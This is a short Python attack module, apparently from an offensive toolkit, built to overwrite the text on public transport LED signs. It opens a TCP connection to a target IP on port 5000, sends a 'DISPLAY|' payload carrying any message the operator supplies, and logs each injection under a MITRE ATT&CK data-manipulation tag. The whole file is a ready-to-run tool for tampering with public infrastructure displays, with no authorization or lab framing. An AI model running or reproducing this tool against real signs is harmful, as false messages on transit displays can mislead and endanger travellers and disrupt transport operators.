#!/usr/bin/env python3
# modules/attacks/public_transport_sign_overwriter.py

import socket
import argparse
import json
import os
import time
from datetime import datetime

LOG_FILE = "results/public_transport_sign_overwrite.json"
MITRE_TTP = "T1565.002"
DEFAULT_PORT = 5000

def log_event(target_ip, message):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target": target_ip,
        "message": message,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def send_overwrite(ip, message, port=DEFAULT_PORT):
    payload = f"DISPLAY|{message}".encode()
    try:
        with socket.create_connection((ip, port), timeout=3) as s:
            s.sendall(payload)
            print(f"[✓] Message sent to transport sign at {ip}:{port}")
            log_event(ip, message)
    except Exception as e:
        print(f"[!] Failed to send: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Overwrite public transport LED display")
    parser.add_argument("--ip", required=True, help="Target IP of display system")
    parser.add_argument("--message", required=True, help="Message to inject")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="TCP port (default: 5000)")
    args = parser.parse_args()
    send_overwrite(args.ip, args.message, args.port)
